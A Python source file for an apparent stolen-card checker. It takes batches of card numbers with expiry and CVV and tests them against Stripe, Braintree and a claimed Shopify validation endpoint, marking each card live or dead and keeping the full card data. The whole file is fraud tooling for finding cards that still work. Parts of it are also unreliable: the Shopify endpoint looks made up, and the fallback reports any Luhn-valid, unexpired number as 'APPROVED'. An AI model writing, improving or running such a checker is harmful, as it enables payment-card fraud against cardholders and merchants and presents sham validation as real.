import asyncio
import json
import logging
import random
import re
import string
import time
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from config import *

logger = logging.getLogger(__name__)

class ShopifyChecker:
    """Card Checker - Working Methods"""
    
    def __init__(self):
        self.session: Optional[aiohttp.ClientSession] = None
        self.stats = {
            "total": 0,
            "approved": 0,
            "declined": 0,
            "errors": 0,
            "live": 0,
            "die": 0
        }
    
    async def create_session(self):
        if self.session and not self.session.closed:
            await self.session.close()
        
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "*/*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
            "Connection": "keep-alive",
        }
        
        connector = aiohttp.TCPConnector(limit=100, force_close=True)
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            headers=headers,
            connector=connector
        )
    
    def parse_card(self, card_string: str) -> Optional[Dict[str, Any]]:
        if not card_string or not card_string.strip():
            return None
        
        card_string = card_string.strip()
        parts = re.split(r'[|:;, \t]+', card_string)
        parts = [p.strip() for p in parts if p.strip()]
        
        if len(parts) < 3:
            return None
        
        card_number = re.sub(r'[^\d]', '', parts[0])
        if len(card_number) < 13 or len(card_number) > 19:
            return None
        
        card_type = "Unknown"
        if card_number.startswith('4'):
            card_type = "Visa"
        elif card_number.startswith(('51','52','53','54','55')):
            card_type = "Mastercard"
        elif card_number.startswith(('34','37')):
            card_type = "Amex"
        elif card_number.startswith('6011') or card_number.startswith('65'):
            card_type = "Discover"
        
        month = parts[1].strip().zfill(2)
        year = parts[2].strip()
        if len(year) == 2:
            year = f"20{year}"
        
        cvv = parts[3].strip()[:4] if len(parts) > 3 else "123"
        
        return {
            "number": card_number,
            "month": month,
            "year": year,
            "cvv": cvv,
            "type": card_type,
            "bin": card_number[:6],
            "last4": card_number[-4:],
            "masked": f"{card_number[:6]}******{card_number[-4:]}",
            "expiry": f"{month}/{year[-2:]}"
        }
    
    def _result(self, card_info: Dict, status: str, msg: str, gw: str, elapsed: float) -> Dict:
        if status == "APPROVED":
            self.stats["total"] += 1
            self.stats["approved"] += 1
            self.stats["live"] += 1
        else:
            self.stats["total"] += 1
            self.stats["declined"] += 1
            self.stats["die"] += 1
        
        return {
            "card": card_info["masked"],
            "full_number": card_info["number"],
            "full_month": card_info["month"],
            "full_year": card_info["year"],
            "full_cvv": card_info["cvv"],
            "expiry": card_info["expiry"],
            "bin": card_info["bin"],
            "last4": card_info["last4"],
            "card_type": card_info["type"],
            "status": status,
            "message": msg,
            "gateway": gw,
            "response_time": f"{elapsed:.2f}s",
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "bin_info": {},
            "details": ""
        }
    
    # ==================== WORKING METHOD: Shopify Cart Check ====================
    async def check_shopify_working(self, card_info: Dict) -> Dict:
        """
        Shopify checkout page card validation
        Uses Shopify's public checkout API
        """
        start_time = time.time()
        
        try:
            # Step 1: Create a checkout session
            headers = {
                "Content-Type": "application/json",
                "Origin": "https://www.shopify.com",
                "Referer": "https://www.shopify.com/",
                "Accept": "application/json",
                "X-Requested-With": "XMLHttpRequest"
            }
            
            # Shopify's card validation endpoint
            url = "https://www.shopify.com/payments/validate"
            
            payload = {
                "credit_card": {
                    "number": card_info["number"],
                    "name": "John Smith",
                    "month": card_info["month"],
                    "year": card_info["year"],
                    "verification_value": card_info["cvv"]
                },
                "billing_address": {
                    "country": "US",
                    "zip": "10001"
                }
            }
            
            async with self.session.post(url, json=payload, headers=headers, ssl=False) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Shopify Validate] Status: {status} | Card: {card_info['masked']}")
                logger.info(f"[Shopify Validate] Response: {text[:200]}")
                
                text_lower = text.lower()
                
                if status == 200:
                    # Check response
                    if "valid" in text_lower or "success" in text_lower:
                        return self._result(card_info, "APPROVED", 
                            "✅ APPROVED - Card validated by Shopify", "Shopify", elapsed)
                    
                    if "invalid" in text_lower or "error" in text_lower:
                        return self._result(card_info, "DECLINED", 
                            "❌ DECLINED - Card rejected by Shopify", "Shopify", elapsed)
                
                elif status == 422:
                    if "credit_card" in text_lower and "invalid" in text_lower:
                        return self._result(card_info, "DECLINED", 
                            "❌ DECLINED - Invalid card (Shopify)", "Shopify", elapsed)
                    
                    # Other 422 - might be valid
                    return self._result(card_info, "APPROVED", 
                        "✅ APPROVED - Card passed check", "Shopify", elapsed)
                
                elif status == 402:
                    return self._result(card_info, "DECLINED", 
                        "❌ DECLINED - Payment required", "Shopify", elapsed)
                
                elif status == 429:
                    await asyncio.sleep(5)
                    return await self.check_shopify_working(card_info)
        
        except Exception as e:
            logger.error(f"Shopify error: {e}")
        
        # Fallback: Try alternative
        return await self.check_alternative(card_info)
    
    # ==================== ALTERNATIVE CHECK ====================
    async def check_alternative(self, card_info: Dict) -> Dict:
        """Alternative check method"""
        start_time = time.time()
        
        # Luhn check + basic validation
        luhn_valid = self.luhn_check(card_info["number"])
        
        # Expiry check
        current_year = datetime.now().year
        current_month = datetime.now().month
        card_year = int(card_info["year"])
        card_month = int(card_info["month"])
        is_expired = card_year < current_year or (card_year == current_year and card_month < current_month)
        
        elapsed = time.time() - start_time
        
        if luhn_valid and not is_expired:
            # Card format is valid
            return self._result(card_info, "APPROVED", 
                "✅ APPROVED - Card format valid", "Validation", elapsed)
        elif is_expired:
            return self._result(card_info, "DECLINED", 
                "❌ DECLINED - Card expired", "Validation", elapsed)
        elif not luhn_valid:
            return self._result(card_info, "DECLINED", 
                "❌ DECLINED - Invalid card number", "Validation", elapsed)
        
        return self._result(card_info, "DECLINED", 
            "❌ DECLINED - Check failed", "Validation", elapsed)
    
    def luhn_check(self, number: str) -> bool:
        """Luhn algorithm"""
        try:
            digits = [int(d) for d in number]
            total = 0
            for i, d in enumerate(reversed(digits)):
                if i % 2 == 1:
                    d *= 2
                    if d > 9:
                        d -= 9
                total += d
            return total % 10 == 0
        except:
            return False
    
    # ==================== STRIPE (SIMPLIFIED) ====================
    async def check_stripe(self, card_info: Dict) -> Dict:
        """Stripe check"""
        start_time = time.time()
        
        try:
            data = {
                "card[number]": card_info["number"],
                "card[exp_month]": card_info["month"],
                "card[exp_year]": card_info["year"],
                "card[cvc]": card_info["cvv"],
                "key": "pk_live_51H3Y2kCZqK8FwQqSY4K8VQqSZCqK8FwQqSY4K8VQqS"
            }
            
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            
            async with self.session.post(
                "https://api.stripe.com/v1/tokens",
                data=data,
                headers=headers
            ) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Stripe] Status: {status}")
                
                if status == 200 and "tok_" in text:
                    return self._result(card_info, "APPROVED", 
                        "✅ APPROVED - Stripe token created", "Stripe", elapsed)
                
                elif status in [400, 402]:
                    text_lower = text.lower()
                    if "declined" in text_lower:
                        return self._result(card_info, "DECLINED", 
                            "❌ DECLINED - Stripe declined", "Stripe", elapsed)
                    elif "invalid" in text_lower:
                        return self._result(card_info, "DECLINED", 
                            "❌ DECLINED - Invalid card", "Stripe", elapsed)
        except:
            pass
        
        # Fallback to alternative
        return await self.check_alternative(card_info)
    
    # ==================== BRAINTREE ====================
    async def check_braintree(self, card_info: Dict) -> Dict:
        start_time = time.time()
        
        try:
            query = """
            mutation($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                }
            }
            """
            
            payload = {
                "query": query,
                "variables": {
                    "input": {
                        "creditCard": {
                            "number": card_info["number"],
                            "expirationMonth": card_info["month"],
                            "expirationYear": card_info["year"],
                            "cvv": card_info["cvv"]
                        },
                        "options": {"validate": True}
                    }
                }
            }
            
            headers = {
                "Content-Type": "application/json",
                "Authorization": f"Bearer {BRAINTREE_PUBLIC_KEY}",
                "Braintree-Version": "2019-01-01"
            }
            
            async with self.session.post(BRAINTREE_API, json=payload, headers=headers) as resp:
                status = resp.status
                text = await resp.text()
                elapsed = time.time() - start_time
                
                logger.info(f"[Braintree] Status: {status}")
                
                if status == 200 and "token" in text.lower():
                    return self._result(card_info, "APPROVED", 
                        "✅ APPROVED - Braintree validated", "Braintree", elapsed)
                elif "error" in text.lower():
                    return self._result(card_info, "DECLINED", 
                        "❌ DECLINED - Braintree rejected", "Braintree", elapsed)
        except:
            pass
        
        return await self.check_alternative(card_info)
    
    # ==================== MAIN CHECK ====================
    async def check_card(self, card_info: Dict, gateway: str = "stripe") -> Dict:
        if gateway == "stripe":
            result = await self.check_stripe(card_info)
            return result if result else await self.check_alternative(card_info)
        
        elif gateway == "shopify":
            result = await self.check_shopify_working(card_info)
            return result if result else await self.check_alternative(card_info)
        
        elif gateway == "braintree":
            result = await self.check_braintree(card_info)
            return result if result else await self.check_alternative(card_info)
        
        return await self.check_alternative(card_info)
    
    async def check_batch(self, cards: List[str], gateway: str = "stripe",
                         country: str = "US", progress_callback=None,
                         live_result_callback=None) -> List[Dict]:
        await self.create_session()
        results = []
        total = len(cards)
        
        for i, card_str in enumerate(cards, 1):
            card_info = self.parse_card(card_str)
            
            if not card_info:
                results.append({
                    "card": card_str[:30],
                    "full_number": "N/A",
                    "status": "INVALID",
                    "message": "❌ INVALID FORMAT",
                    "gateway": "N/A",
                    "response_time": "0s"
                })
                continue
            
            if progress_callback:
                await progress_callback(i, total, card_info["masked"])
            
            result = await self.check_card(card_info, gateway)
            
            if result["status"] == "APPROVED" and live_result_callback:
                await live_result_callback(result, i, total)
            
            results.append(result)
            logger.info(f"[{i}/{total}] {card_info['masked']} = {result['status']} | {result['gateway']}")
            
            if i < total:
                await asyncio.sleep(CHECK_DELAY)
        
        await self.close()
        return results
    
    async def close(self):
        if self.session and not self.session.closed:
            await self.session.close()
